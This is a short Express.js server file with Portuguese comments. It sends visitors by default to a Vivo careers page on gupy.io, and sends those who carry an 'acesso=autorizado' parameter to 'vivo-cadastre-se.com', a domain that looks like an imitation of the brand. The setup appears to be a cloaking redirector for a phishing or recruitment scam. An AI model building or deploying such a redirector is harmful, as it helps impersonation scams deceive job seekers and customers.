// Arquivo ESM para o Heroku - usando extensão .mjs para garantir compatibilidade
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

// Configuração para ESM obter __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Aplicação Express
const app = express();

// Middleware básico
app.use(express.json());
app.use(express.static('dist/public'));

// Configurar CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Tratar rotas específicas que causam problemas
app.get('/favicon.ico', (req, res) => {
  res.status(204).end();
});

app.get('/acesso-autorizado', (req, res) => {
  res.redirect('/?acesso=autorizado');
});

// Rota de status para verificação de saúde
app.get('/api/status', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env: process.env.NODE_ENV
  });
});

// Rota de redirecionamento
app.get('/api/redirect', (req, res) => {
  try {
    const hasAuthParam = req.query.acesso === 'autorizado';
    const targetDomain = hasAuthParam ? 'vivo-cadastre-se.com' : 'atendimentovivo.gupy.io';
    const redirectUrl = hasAuthParam ? `https://${targetDomain}?acesso=autorizado` : `https://${targetDomain}`;
    console.log('Redirecionando para:', redirectUrl);
    return res.redirect(307, redirectUrl);
  } catch (error) {
    console.error('Erro ao redirecionar:', error);
    return res.status(500).json({ error: 'Falha no redirecionamento' });
  }
});

// Rota principal para redirecionamento instantâneo
app.get('/', (req, res) => {
  try {
    const hasAuthParam = req.query.acesso === 'autorizado';
    
    // Se tiver o parâmetro dashboard, enviar o HTML
    if (req.query.dashboard === 'true') {
      return res.sendFile(path.join(__dirname, 'dist', 'public', 'index.html'));
    }
    
    // Caso contrário, fazer o redirecionamento direto
    const targetDomain = hasAuthParam ? 'vivo-cadastre-se.com' : 'atendimentovivo.gupy.io';
    const redirectUrl = hasAuthParam ? `https://${targetDomain}?acesso=autorizado` : `https://${targetDomain}`;
    console.log('Redirecionando diretamente para:', redirectUrl);
    return res.redirect(307, redirectUrl);
  } catch (error) {
    console.error('Erro no redirecionamento principal:', error);
    return res.sendFile(path.join(__dirname, 'dist', 'public', 'index.html'));
  }
});

// Dashboard
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'public', 'index.html'));
});

// Todas as outras rotas servem o index.html para SPA funcionar
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  res.sendFile(path.join(__dirname, 'dist', 'public', 'index.html'));
});

// Iniciar o servidor
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT} no ambiente ${process.env.NODE_ENV || 'development'}`);
});